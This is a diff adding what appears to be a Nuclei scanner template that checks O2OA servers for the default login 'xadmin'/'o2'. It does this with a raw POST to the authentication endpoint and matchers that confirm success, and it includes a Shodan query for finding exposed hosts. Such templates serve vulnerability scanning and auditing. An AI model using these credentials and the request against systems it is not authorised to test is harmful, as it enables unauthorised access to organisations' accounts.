@@ -1,0 +1,56 @@
+id: o2oa-default-login
+
+info:
+  name: O2OA - Default Login
+  author: SleepingBag945
+  severity: high
+  description: |
+    O2OA default login credentials were discovered.
+  classification:
+    cpe: cpe:2.3:a:zoneland:o2oa:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    max-request: 1
+    vendor: zoneland
+    product: o2oa
+    shodan-query: http.title=="o2oa"
+    runzero-match: any(each(service["html.titles"]), {# matches "O2OA"})
+  tags: o2oa,default-login
+
+http:
+  - raw:
+      - |
+        POST /x_organization_assemble_authentication/jaxrs/authentication/captcha HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: x-token=anonymous
+        Authorization: anonymous
+        Accept: text/html,application/json,*/*
+        Content-Type: application/json; charset=UTF-8
+
+        {"credential":"{{username}}","password":"{{password}}"}
+
+    payloads:
+      username:
+        - 'xadmin'
+      password:
+        - 'o2'
+    attack: pitchfork
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "\"type\": \"success\""
+          - "distinguishedName"
+        condition: and
+
+      - type: word
+        part: header
+        words:
+          - "application/json"
+
+      - type: status
+        status:
+          - 200
+
